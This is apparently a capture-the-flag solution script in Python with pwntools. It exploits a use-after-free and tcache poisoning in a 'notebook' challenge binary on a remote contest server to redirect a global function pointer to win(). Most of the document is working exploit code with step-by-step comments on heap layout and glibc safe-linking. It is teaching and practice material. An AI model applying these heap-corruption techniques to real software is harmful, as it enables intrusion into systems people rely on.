#!/usr/bin/env python3
from pwn import *

#
# Exploitation strategy:
#
# This binary contains a Use-After-Free (UAF) vulnerability combined with
# tcache poisoning to redirect malloc() to an arbitrary address.
#
# The program manages an array of 8 notes (0x60-byte chunks) and exposes
# a global function pointer `global_handler` (in BSS) that is invoked via
# option 5 ("trigger"). The goal is to overwrite `global_handler` with the
# address of `win()`.
#
# Unlike a direct UAF (where the function pointer lives inside the heap chunk
# itself), here the target is a global variable, so we cannot overwrite it
# by simply re-editing a freed chunk. Instead, we abuse tcache poisoning to
# make malloc() return a pointer to `global_handler` itself.
#
# Tcache poisoning works by corrupting the `fd` (forward pointer) field of a
# freed chunk. When a chunk sits in the tcache freelist, its first 8 bytes
# hold the address of the next free chunk. By overwriting that pointer with
# an arbitrary address, the next two malloc() calls of the same size will
# return, in order: the poisoned chunk, then the arbitrary address.
#
# Step-by-step exploit:
#   1. Allocate note[0] and note[1] (both 0x60 bytes -> tcache bin 0x70).
#   2. Free note[0], then note[1].
#      Tcache freelist (LIFO): note[1] -> note[0] -> NULL
#   3. Leak heap addresses via option 4 ("show"):
#      - note[1].fd = address of note[0]  (it's in plaintext, because glibc < 2.32, hence there is no safe-linking).
#      - note[0].fd = NULL (last in list).
#      Reading the first 8 bytes of the freed note[1] gives us note[0]'s
#      address, from which we derive note[1]'s address (contiguous chunks, step 0x70).
#   4. UAF-edit note[1]: overwrite its `fd` with &global_handler.
#      Tcache freelist: note[1] -> global_handler -> ???
#   5. malloc() twice (same size):
#      - First allocation  -> returns note[1] (harmless filler written).
#      - Second allocation -> returns &global_handler (tcache now poisoned).
#        Write p64(win) into this allocation to set global_handler = win.
#   6. Trigger option 5: global_handler("hello") -> win().
#
# Note on safe-linking (glibc >= 2.32):
#   On newer glibc versions the fd pointer is mangled:
#       stored_fd = (fd >> 12) XOR (chunk_address >> 12)
#   For this challenge, the remote server runs glibc < 2.32, so fd pointers are stored in
#   plaintext and no XOR demangling is required.
#

context.binary = elf = ELF('./notebook', checksec=False)

p = remote("offsec.m0lecon.it", 13529)

win = elf.sym.win                           # or run:  nm ./notebook | grep "win"
global_handler = elf.sym.global_handler     # or run:  nm ./notebook | grep "global_handler"

def create(index, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendafter(b'data: ', data)

def free(index):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(index).encode())

def edit(index, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendafter(b'data: ', data)

def show(index):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(index).encode())
    return p.recvline()

def trigger():
    p.sendlineafter(b'> ', b'5')


# Step 1: allocate two notes of the same size
create(0, b'A' * 0x60)
create(1, b'B' * 0x60)

# Step 2: free both notes => tcache is LIFO, so the freelist becomes: note[1] -> note[0] -> NULL
free(0)
free(1)

# Step 3: leak heap addresses
# note[1] is freed but its pointer is not NULLed out (hence there is a UAF vulnerability).
# Its first 8 bytes now hold its tcache fd, which points to note[0] in plaintext.
leak = show(1)  # take note[1]'s fd pointer (i.e. address of note[0])
note0_addr = u64(leak[:8].ljust(8, b'\x00'))   # the fd pointer is just the first 8 bytes of the leak
log.info(f"note[0] @ {hex(note0_addr)}")

# note[1] is contiguous with note[0] and was allocated after it,
# so note[1] = note[0] + chunk_size (0x60 NOTE_SIZE + 0x10 chunk header = 0x70).
note1_addr = note0_addr + 0x70
log.info(f"note[1] @ {hex(note1_addr)}")

# Step 4: tcache poisoning
# Overwrite note[1]'s fd pointer with the address of global_handler.
# After this, the tcache freelist becomes:
#   note[1] -> global_handler -> ???
edit(1, p64(global_handler).ljust(0x60, b'\x00'))

# Step 5: two mallocs to reach global_handler
create(2, b'A' * 0x60)                    # pops note[1] from the freelist, so the tcache freelist becomes:  global_handler -> ???
create(3, p64(win).ljust(0x60, b'\x00'))  # pops global_handler from the freelist and writes `win()` into it

log.info(f"global_handler now points to win @ {hex(win)}")

# Step 6: trigger the overwritten handler
trigger()   # calls global_handler("hello") -> win()

p.interactive()
